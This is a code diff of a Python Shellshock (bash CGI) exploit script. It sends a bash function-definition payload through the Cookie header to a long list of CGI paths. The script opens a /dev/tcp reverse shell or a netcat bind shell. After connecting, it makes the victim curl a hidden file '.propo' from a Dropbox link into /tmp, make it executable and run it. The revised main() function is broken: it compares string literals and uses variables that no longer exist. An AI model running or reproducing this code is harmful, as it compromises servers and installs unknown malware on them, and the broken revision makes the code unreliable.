@@ -40,117 +40,135 @@ Marcus Agard, Robert Unnold 2020
 	sys.exit(0)
 
 def exploit(lhost,lport,rhost,rport,payload,pages):
-	headers = {"Cookie": payload,} #"Referer": payload}
+	headers = {"Cookie": payload,}
 
 	for page in pages:
 		if stop:
 			return
-		print(f"[-] Trying exploit on : {page}")
+		print(f"[-] Trying exploit on: {page}")
 		resp = req.get(f"http://{rhost}{page}", headers=headers)
 		if resp.status_code == 404:
 			print(f"[*] 404 on: {page}")
-		time.sleep(1)
-
-
-args = {}
-
-for arg in sys.argv[1:]:
-	ar = arg.split("=")
-	args[ar[0]] = ar[1]
-try:
-	args['payload']
-except:
-	usage()
-
-if args['payload'] == 'reverse':
-	try:
-		lhost = args['lhost']
-		lport = int(args['lport'])
-		rhost = args['rhost']
-		payload = "() { :;}; /bin/bash -c /bin/bash -i >& /dev/tcp/"+lhost+"/"+str(lport)+" 0>&1 2>&1 &"
-	except:
-		usage()
-elif args['payload'] == 'bind':
-	try:
-		rhost = args['rhost']
-		rport = args['rport']
-		payload = "() { :;}; /bin/bash -c 'nc -l -p "+rport+" -e /bin/bash &'"
-	except:
-		usage()
-else:
-	print("[*] Unsupported payload")
-	usage()
-
-try:
-	pages = args['pages'].split(",")
-except:
-	pages = ["/cgi-sys/entropysearch.cgi","/cgi-sys/defaultwebpage.cgi","/cgi-mod/index.cgi","/cgi-bin/test.cgi","/cgi-bin-sdb/printenv"]
-
-if args['payload'] == 'reverse':
-	serversocket = socket(AF_INET, SOCK_STREAM)
-	buff = 1024
-	addr = (lhost, lport)
-	serversocket.bind(addr)
-	serversocket.listen(10)
-	print("[!] Started reverse shell handler")
-	_thread.start_new_thread(exploit,(lhost,lport,rhost,0,payload,pages,))
-if args['payload'] == 'bind':
-	serversocket = socket(AF_INET, SOCK_STREAM)
-	addr = (rhost,int(rport))
-	_thread.start_new_thread(exploit,("",0,rhost,rport,payload,pages,))
-
-buff = 1024
-
-while True:
-	if args['payload'] == 'reverse':
-		clientsocket, clientaddr = serversocket.accept()
-		print("[!] Successfully exploited")
-		print(f"[!] Incoming connection from {clientaddr[0]}")
-		stop = True
-		clientsocket.settimeout(100)
-		# These links may change as we update the files
-		print("[-] Obtaining propo...")
-		clientsocket.sendall("curl https://uc12a87c04a246091c04d4551b0a.dl.dropboxusercontent.com/cd/0/get/Av2rnc6yg7Qgjl9VMEhclOFWgphJHkh0qTTbfWc5c2UOW3Od1mXMKutT6z6xzPV4F4XWrYuN55blSuFvjDkdpD6Z5poIKSp1yDf1DDHahNGYgQtmmVgoWuSotjSmKsN0JtE/file --output /tmp/.propo --silent\n".encode())
-		time.sleep(5)
-		# data = clientsocket.recv(buff)
-		# print(data.decode())
-		print("[-] Changing propo file mode...")
-		clientsocket.sendall("chmod +x /tmp/.propo\n".encode())
-		time.sleep(1)
-		# data = clientsocket.recv(buff)
-		print("[-] Checking existence and executability of propo...")
-		clientsocket.sendall("ls /tmp -al | grep .propo\n".encode())
-		time.sleep(1)
-		data = clientsocket.recv(buff)
-		print(data.decode())
-		if "-rwxr-xr-x" not in data.decode():
-			print("Catastrophic failure!!!!!")
 		else:
-			clientsocket.sendall("/tmp/.propo\n".encode())
-			clientsocket.close()
-			sys.exit(0)
-		# while True:
-		# 	reply = input(f"{clientaddr[0]}> ")
-		# 	clientsocket.sendall(f"{reply}\n".encode())
-		# 	try:
-		# 		data = clientsocket.recv(buff)
-		# 		print(data.decode())
-		# 	except:
-		# 		pass
+			break
+		time.sleep(1)
 
-	if args['payload'] == 'bind':
+def main(payload,lhost,lport,rhost):
+
+	if 'payload' == 'reverse':
 		try:
-			serversocket = socket(AF_INET, SOCK_STREAM)
-			time.sleep(1)
-			serversocket.connect(addr)
-			print("[!] Successfully exploited")
-			print(f"[!] Connected to {rhost}")
-			stop = True
-			serversocket.settimeout(3)
-			while True:
-				reply = input(f"{rhost}> ")
-				serversocket.sendall(f"{reply}\n".encode())
-				data = serversocket.recv(buff)
-				print(data.decode())
+			lhost = args['lhost']
+			lport = int(args['lport'])
+			rhost = args['rhost']
+			payload = "() { :;}; /bin/bash -c /bin/bash -i >& /dev/tcp/"+lhost+"/"+str(lport)+" 0>&1 2>&1 &"
 		except:
-			pass
+			usage()
+	elif 'payload' == 'bind':
+		try:
+			rhost = args['rhost']
+			rport = args['rport']
+			payload = "() { :;}; /bin/bash -c 'nc -l -p "+rport+" -e /bin/bash &'"
+		except:
+			usage()
+	else:
+		print("[*] Unsupported payload")
+		usage()
+
+	pages = ["/cgi-sys/entropysearch.cgi",
+			"/cgi-sys/defaultwebpage.cgi",
+			"/cgi-mod/index.cgi",
+			"/cgi-bin/test.cgi",
+			"/cgi-bin-sdb/printenv",
+			"/cgi-bin/bash",
+			"/cgi-bin/contact.cgi",
+			"/cgi-bin/defaultwebpage.cgi",
+			"/cgi-bin/env.cgi",
+			"/cgi-bin/fire.cgi",
+			"/cgi-bin/forum.cgi",
+			"/cgi-bin/hello.cgi",
+			"/cgi-bin/index.cgi",
+			"/cgi-bin/login.cgi",
+			"/cgi-bin/main.cgi",
+			"/cgi-bin/meme.cgi",
+			"/cgi-bin/php",
+			"/cgi-bin/php4",
+			"/cgi-bin/php5",
+			"/cgi-bin/php5-cli",
+			"/cgi-bin/recent.cgi",
+			"/cgi-bin/sat-ir-web.pl",
+			"/cgi-bin/status",
+			"/cgi-bin/test-cgi",
+			"/cgi-bin/test.cgi",
+			"/cgi-bin/test-cgi.pl",
+			"/cgi-bin/test.sh",
+			"/cgi-bin/tools/tools.pl",
+			"/cgi-sys/php5",
+			"/phppath/cgi_wrapper",
+			"/phppath/php",]
+
+	if 'payload' == 'reverse':
+		serversocket = socket(AF_INET, SOCK_STREAM)
+		buff = 1024
+		addr = (lhost, lport)
+		serversocket.bind(addr)
+		serversocket.listen(10)
+		print("[!] Started reverse shell handler")
+		_thread.start_new_thread(exploit,(lhost,lport,rhost,0,payload,pages,))
+	if 'payload' == 'bind':
+		serversocket = socket(AF_INET, SOCK_STREAM)
+		addr = (rhost,int(rport))
+		_thread.start_new_thread(exploit,("",0,rhost,rport,payload,pages,))
+
+	buff = 1024
+
+	while True:
+		if 'payload' == 'reverse':
+			clientsocket, clientaddr = serversocket.accept()
+			print("[!] Successfully exploited")
+			print(f"[!] Incoming connection from {clientaddr[0]}")
+			# Hands off keyboard exploitation
+			stop = True
+			clientsocket.settimeout(100)
+			# TODO: Find general purpose method of testing w/o use of locate
+			"""
+			print("[-] Testing if target has already been exploited...")
+			clientsocket.sendall("ls /home/$(whoami)/Desktop/pwnd.jpeg".encode())
+			time.sleep(1)
+			data = clientsocket.recv(buff)
+			if
+			"""
+			print("[-] Obtaining propo...")
+			# These links may change as we update the files
+			clientsocket.sendall("curl https://ucd0ed002c52cfa1b66540204dcf.dl.dropboxusercontent.com/cd/0/get/Av7teclquAK8imFhQfRXJ-B5Hks-kaDUK52Zlm1HkhktnoCjcedhXgFCuyitcOXv31ippojCstAR81sn4iEK9oMxSHiF5i8TqhBZLBtBjnf9nHGXa6_F-m_WCJnNrbqEWhc/file --output /tmp/.propo --silent\n".encode())
+			time.sleep(3)
+			print("[-] Changing propo file mode...")
+			clientsocket.sendall("chmod +x /tmp/.propo\n".encode())
+			time.sleep(1)
+			print("[-] Checking existence and executability of propo...")
+			clientsocket.sendall("ls /tmp -al | grep .propo\n".encode())
+			time.sleep(1)
+			data = clientsocket.recv(buff)
+			print(data.decode())
+			if "-rwxr-xr-x" not in data.decode():
+				print("Catastrophic failure!!!!!")
+			else:
+				clientsocket.sendall("/tmp/.propo\n".encode())
+				clientsocket.close()
+				sys.exit(0)
+		# Bind shell is less stable, so we won't implement for it
+		if 'payload' == 'bind':
+			try:
+				serversocket = socket(AF_INET, SOCK_STREAM)
+				time.sleep(1)
+				serversocket.connect(addr)
+				print("[!] Successfully exploited")
+				print(f"[!] Connected to {rhost}")
+				stop = True
+				serversocket.settimeout(3)
+				while True:
+					reply = input(f"{rhost}> ")
+					serversocket.sendall(f"{reply}\n".encode())
+					data = serversocket.recv(buff)
+					print(data.decode())
+			except:
+				pass
